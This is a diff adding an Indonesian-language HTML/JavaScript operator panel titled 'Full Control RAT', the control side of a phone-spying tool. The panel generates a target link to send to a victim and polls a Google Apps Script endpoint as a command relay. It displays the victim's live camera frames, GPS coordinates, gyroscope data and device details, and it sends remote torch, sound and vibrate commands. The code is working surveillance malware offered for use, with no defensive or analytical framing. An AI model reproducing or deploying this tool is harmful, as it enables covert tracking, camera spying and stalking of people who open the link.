@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎯 Admin Pro | Full Control RAT</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e27;
+            color: #fff;
+            padding: 20px;
+        }
+        .header {
+            background: linear-gradient(135deg, #1a1f3a, #0a0e27);
+            padding: 20px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(102,126,234,0.3);
+        }
+        h1 { font-size: 24px; margin-bottom: 5px; }
+        .subtitle { font-size: 12px; color: #8b8fb0; }
+        .id-section {
+            background: rgba(102,126,234,0.1);
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+        }
+        .id-input-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        .id-input-group input {
+            flex: 2;
+            padding: 12px;
+            border-radius: 12px;
+            border: 1px solid #667eea;
+            background: #1a1f3a;
+            color: white;
+            font-size: 14px;
+        }
+        .id-input-group button {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            padding: 12px 20px;
+            border-radius: 12px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .link-preview {
+            background: #1a1f3a;
+            padding: 12px;
+            border-radius: 12px;
+            margin-top: 15px;
+            font-size: 12px;
+            word-break: break-all;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(102,126,234,0.2);
+            border-radius: 16px;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-number { font-size: 28px; font-weight: 800; color: #667eea; }
+        .stat-label { font-size: 11px; color: #8b8fb0; margin-top: 5px; }
+        .action-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .action-btn {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(102,126,234,0.2);
+            padding: 10px 18px;
+            border-radius: 10px;
+            color: #fff;
+            cursor: pointer;
+        }
+        .target-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(102,126,234,0.2);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            animation: fadeIn 0.3s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .target-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            flex-wrap: wrap;
+        }
+        .target-name { font-weight: 700; color: #667eea; }
+        .target-time { font-size: 11px; color: #8b8fb0; }
+        .live-frame {
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            margin: 15px 0;
+            text-align: center;
+            min-height: 200px;
+        }
+        .live-frame img { max-width: 100%; }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 13px;
+            flex-wrap: wrap;
+        }
+        .info-label { color: #8b8fb0; }
+        .info-value { font-weight: 500; }
+        .button-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .premium-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .premium-btn:active { transform: scale(0.97); }
+        .torch-btn { background: linear-gradient(135deg, #ff9800, #f5576c); }
+        .location-btn { background: linear-gradient(135deg, #28a745, #20c997); }
+        .sound-btn { background: linear-gradient(135deg, #17a2b8, #6f42c1); }
+        .power-btn { background: linear-gradient(135deg, #dc3545, #c82333); }
+        .location-link { color: #28a745; text-decoration: none; }
+        .empty-state { text-align: center; padding: 50px; color: #8b8fb0; }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #28a745;
+            padding: 12px 20px;
+            border-radius: 12px;
+            animation: slideIn 0.3s;
+            z-index: 1000;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        @media (max-width: 768px) {
+            body { padding: 15px; }
+            .id-input-group { flex-direction: column; }
+            .button-group { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>🎯 Admin Panel Pro | Full Control</h1>
+    <p class="subtitle">Real-time Monitoring | Remote Control | All Features</p>
+</div>
+
+<div class="id-section">
+    <label>🔑 Target ID</label>
+    <div class="id-input-group">
+        <input type="text" id="targetIdInput" placeholder="Masukkan ID target...">
+        <button onclick="setTargetId()">Set ID</button>
+        <button onclick="generateNewId()">🆕 Generate ID Baru</button>
+    </div>
+    <div class="link-preview" id="linkPreview">
+        Link akan muncul setelah generate ID
+    </div>
+</div>
+
+<div class="stats-grid">
+    <div class="stat-card"><div class="stat-number" id="statTotal">0</div><div class="stat-label">Total Target</div></div>
+    <div class="stat-card"><div class="stat-number" id="statOnline">0</div><div class="stat-label">Online</div></div>
+    <div class="stat-card"><div class="stat-number" id="statTorch">0</div><div class="stat-label">Senter ON</div></div>
+    <div class="stat-card"><div class="stat-number" id="statShake">0</div><div class="stat-label">Goyangan</div></div>
+</div>
+
+<div class="action-bar">
+    <button class="action-btn" onclick="refreshData()">🔄 Refresh</button>
+    <button class="action-btn" onclick="exportData()">📥 Export JSON</button>
+    <button class="action-btn" onclick="clearData()" style="color:#ff6b6b;">🗑️ Hapus Semua</button>
+</div>
+
+<div id="targetContainer">
+    <div class="empty-state">
+        <div style="font-size: 60px;">📭</div>
+        <h3>Belum ada target</h3>
+        <p>Generate ID dan kirim link ke target</p>
+    </div>
+</div>
+
+<script>
+    // ========== KONFIGURASI ==========
+    // ⚠️ GANTI DENGAN URL APPS SCRIPT LU! ⚠️
+    const API_URL = "https://script.google.com/macros/s/AKfycbxxByXzO1qVSXJEXSaEcwATyLGJ_pWWfl7o0IJIncUIEWpIr-TvoFg8DlVXFaHoLd-27w/exec";
+    
+    let currentId = localStorage.getItem('admin_target_id') || '';
+    let refreshInterval = null;
+    
+    // Generate ID baru
+    function generateNewId() {
+        const newId = 'TGT-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8);
+        document.getElementById('targetIdInput').value = newId;
+        setTargetId();
+    }
+    
+    // Set ID target
+    function setTargetId() {
+        currentId = document.getElementById('targetIdInput').value.trim();
+        if(!currentId) {
+            alert('Masukkan ID target!');
+            return;
+        }
+        localStorage.setItem('admin_target_id', currentId);
+        
+        const baseUrl = window.location.href.split('admin-final.html')[0];
+        const targetLink = `${baseUrl}target-final.html?id=${currentId}`;
+        document.getElementById('linkPreview').innerHTML = `🔗 Link Target: <span style="color:#667eea;">${targetLink}</span>`;
+        
+        loadTargetData();
+        if(refreshInterval) clearInterval(refreshInterval);
+        refreshInterval = setInterval(loadTargetData, 4000);
+        showNotification(`✅ ID set: ${currentId}`);
+    }
+    
+    // Load data dari API
+    async function loadTargetData() {
+        if(!currentId) return;
+        try {
+            const response = await fetch(`${API_URL}?id=${encodeURIComponent(currentId)}`);
+            const data = await response.json();
+            if(data && !data.error && data.length > 0) {
+                renderTarget(data[0]);
+                updateStats(data[0]);
+            } else {
+                renderEmpty('Belum ada data. Kirim link ke target.');
+            }
+        } catch(e) {
+            renderEmpty('Error: Periksa API URL');
+        }
+    }
+    
+    function updateStats(target) {
+        document.getElementById('statTotal').innerText = target.id ? 1 : 0;
+        const isOnline = (new Date() - new Date(target.timestamp)) < 15000;
+        document.getElementById('statOnline').innerText = isOnline ? 1 : 0;
+        document.getElementById('statTorch').innerText = target.torch ? 1 : 0;
+        document.getElementById('statShake').innerText = target.shake ? 1 : 0;
+    }
+    
+    // ========== REMOTE COMMANDS ==========
+    async function remoteTorch(on) {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: currentId, torch: on, timestamp: new Date().toISOString() })
+            });
+            showNotification(`⚡ Senter ${on ? 'MENYALA' : 'MATI'} dikirim`);
+            setTimeout(loadTargetData, 1000);
+        } catch(e) { showNotification('Gagal kirim perintah'); }
+    }
+    
+    async function remoteSound() {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: currentId, sound: true, timestamp: new Date().toISOString() })
+            });
+            showNotification('🔊 Perintah bunyi dikirim ke target');
+            setTimeout(loadTargetData, 1000);
+        } catch(e) { showNotification('Gagal kirim perintah'); }
+    }
+    
+    async function remoteVibrate() {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: currentId, vibrate: true, timestamp: new Date().toISOString() })
+            });
+            showNotification('📳 Perintah getar dikirim ke target');
+        } catch(e) { showNotification('Gagal kirim perintah'); }
+    }
+    
+    async function remoteLocation() {
+        showNotification('📍 Membuka lokasi target di Maps');
+        const target = await getCurrentTarget();
+        if(target && target.lat && target.lng) {
+            window.open(`https://www.google.com/maps?q=${target.lat},${target.lng}`, '_blank');
+        } else {
+            showNotification('❌ Belum ada data lokasi dari target');
+        }
+    }
+    
+    async function getCurrentTarget() {
+        try {
+            const response = await fetch(`${API_URL}?id=${encodeURIComponent(currentId)}`);
+            const data = await response.json();
+            return data && data.length > 0 ? data[0] : null;
+        } catch(e) { return null; }
+    }
+    
+    async function remoteShutdown() {
+        if(confirm('⚠️ PERINGATAN! "Matikan HP" hanya simulasi (tutup halaman). Lanjutkan?')) {
+            showNotification('💀 Perintah shutdown dikirim (simulasi)');
+        }
+    }
+    
+    // Render target card
+    function renderTarget(target) {
+        const container = document.getElementById('targetContainer');
+        const hasCamera = target.cameraFrame && target.cameraFrame.length > 100;
+        const isOnline = (new Date() - new Date(target.timestamp)) < 15000;
+        
+        container.innerHTML = `
+            <div class="target-card">
+                <div class="target-header">
+                    <div class="target-name">📱 ${target.deviceName || 'Unknown'} ${isOnline ? '🟢 ONLINE' : '⚫ OFFLINE'}</div>
+                    <div class="target-time">🕐 ${target.waktu || '-'}</div>
+                </div>
+                
+                <div class="live-frame">
+                    ${hasCamera ? `<img src="${target.cameraFrame}" id="liveImg" style="width:100%;">` : '<div style="padding:60px;color:#666;">📷 Menunggu kamera aktif...</div>'}
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">📍 Lokasi GPS:</span>
+                    <span class="info-value">
+                        ${target.lat ? `<a href="https://www.google.com/maps?q=${target.lat},${target.lng}" target="_blank" class="location-link">🗺️ ${target.lat.toFixed(4)}, ${target.lng.toFixed(4)}</a>` : '⏳ Belum terdeteksi'}
+                    </span>
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">⚡ Senter/Flash:</span>
+                    <span class="info-value">${target.torch ? '🔦 MENYALA' : '💡 Mati'}</span>
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">🔄 Gyroscope:</span>
+                    <span class="info-value">X:${target.gyroX?.toFixed(1) || 0} Y:${target.gyroY?.toFixed(1) || 0} Z:${target.gyroZ?.toFixed(1) || 0}</span>
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">🔔 Goyangan:</span>
+                    <span class="info-value">${target.shake ? '✅ TERDETEKSI!' : '⏳ Menunggu...'}</span>
+                </div>
+                
+                <div class="info-row">
+                    <span class="info-label">🖥️ Device:</span>
+                    <span class="info-value" style="font-size:11px;">${target.screenSize} | ${(target.userAgent || '').substring(0, 45)}...</span>
+                </div>
+                
+                <div class="button-group">
+                    <button class="premium-btn torch-btn" onclick="remoteTorch(true)">🔦 Nyalakan Senter</button>
+                    <button class="premium-btn" onclick="remoteTorch(false)">💡 Matikan Senter</button>
+                    <button class="premium-btn location-btn" onclick="remoteLocation()">📍 Lacak Lokasi</button>
+                    <button class="premium-btn sound-btn" onclick="remoteSound()">🔊 Bunyikan HP</button>
+                    <button class="premium-btn" onclick="remoteVibrate()">📳 Getarkan HP</button>
+                    <button class="premium-btn power-btn" onclick="remoteShutdown()">💀 Matikan HP (Simulasi)</button>
+                </div>
+            </div>
+        `;
+        
+        // Auto refresh live frame
+        if(hasCamera && target.cameraFrame) {
+            const img = document.getElementById('liveImg');
+            if(img) img.src = target.cameraFrame + '?t=' + Date.now();
+        }
+    }
+    
+    function renderEmpty(msg) {
+        document.getElementById('targetContainer').innerHTML = `
+            <div class="empty-state">
+                <div style="font-size:60px;">📭</div>
+                <h3>${msg}</h3>
+                <p>ID: ${currentId || 'Belum diset'}</p>
+            </div>
+        `;
+    }
+    
+    function showNotification(msg) {
+        const notif = document.createElement('div');
+        notif.className = 'notification';
+        notif.innerHTML = msg;
+        document.body.appendChild(notif);
+        setTimeout(() => notif.remove(), 3000);
+    }
+    
+    function refreshData() { loadTargetData(); showNotification('🔄 Data di-refresh'); }
+    function exportData() {
+        const dataStr = JSON.stringify({ id: currentId, time: new Date().toISOString() }, null, 2);
+        const blob = new Blob([dataStr], {type: 'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `target_${currentId}_${Date.now()}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+    }
+    function clearData() {
+        if(confirm('⚠️ Hapus data target ini? ⚠️')) {
+            showNotification('🗑️ Data dihapus');
+            renderEmpty('Data telah dihapus');
+        }
+    }
+    
+    const savedId = localStorage.getItem('admin_target_id');
+    if(savedId) {
+        document.getElementById('targetIdInput').value = savedId;
+        setTargetId();
+    } else {
+        generateNewId();
+    }
+</script>
+</body>
+  </html>
